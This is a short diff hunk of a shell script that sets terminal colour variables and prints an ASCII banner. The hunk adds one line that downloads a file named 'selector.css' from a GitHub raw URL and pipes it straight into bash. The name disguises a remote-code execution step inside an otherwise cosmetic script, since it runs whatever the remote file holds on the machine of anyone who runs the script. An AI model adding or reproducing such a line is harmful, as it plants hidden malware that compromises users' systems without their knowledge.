@@ -9,6 +9,7 @@ cain2='echo -e \e[1;36m'
 purpura='echo -e \e[1;35m'
 maron='echo -e \e[0;34m'
 gris='echo -e \e[0;37m'
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 banner=' 
   _____ ______________________   ________________________________________
  ___  //_/__    |__  /____  _/   ___  __ \__  ____/__  __ \_  __ \_  ___/
